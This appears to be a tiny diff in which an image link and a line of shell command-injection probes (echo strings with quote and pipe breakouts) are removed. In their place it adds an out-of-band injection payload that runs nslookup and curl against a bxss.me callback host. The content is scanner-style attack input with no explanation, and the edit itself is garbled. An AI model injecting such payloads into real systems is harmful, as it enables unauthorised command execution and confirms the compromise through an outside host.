@@ -1,2 +1,1 @@
-![](/wimage/MO_394669891912_001/Abc/m.jpg)
-|echo zrjfha$()\ khlhda\nz^xyu||a #' |echo zrjfha$()\ khlhda\nz^xyu||a #|" |echo zrjfha$()\ khlhda\nz^xyu||a #
+(nslookup -q=cname hitmnnhmgcecs17968.bxss.me||curl hitmnnhmgcecs17968.bxss.me))
